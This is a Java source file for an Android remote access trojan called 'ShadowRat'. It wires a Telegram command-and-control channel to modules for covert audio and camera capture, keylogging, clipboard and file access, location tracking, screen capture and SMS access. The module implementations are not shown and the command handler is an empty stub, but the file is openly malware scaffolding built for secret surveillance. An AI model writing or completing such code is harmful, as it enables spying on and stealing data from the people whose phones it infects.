package com.shadow.rat;

import android.content.Context;
import android.view.View;
import com.shadow.rat.c2.C2Manager;
import com.shadow.rat.c2.TelegramC2Manager;
import com.shadow.rat.modules.AudioRecorder;
import com.shadow.rat.modules.CameraManager;
import com.shadow.rat.modules.ClipboardManager;
import com.shadow.rat.modules.FileManager;
import com.shadow.rat.modules.Keylogger;
import com.shadow.rat.modules.LocationTracker;
import com.shadow.rat.modules.ScreenCapture;
import com.shadow.rat.modules.SmsManager;

public class ShadowRat {

    private final C2Manager c2Manager;

    public ShadowRat(Context context, View rootView) {
        c2Manager = TelegramC2Manager.getInstance(context);
        registerModules(context, rootView);
        c2Manager.startListening(command -> {
            // Handle command
        });
    }

    private void registerModules(Context context, View rootView) {
        c2Manager.registerModule("audio", new AudioRecorder(context));
        c2Manager.registerModule("camera", new CameraManager(context));
        c2Manager.registerModule("clipboard", new ClipboardManager(context));
        c2Manager.registerModule("file", new FileManager(context));
        c2Manager.registerModule("keylogger", new Keylogger(context));
        c2Manager.registerModule("location", new LocationTracker(context));
        c2Manager.registerModule("screen", new ScreenCapture(context, rootView));
        c2Manager.registerModule("sms", new SmsManager(context));
    }
}
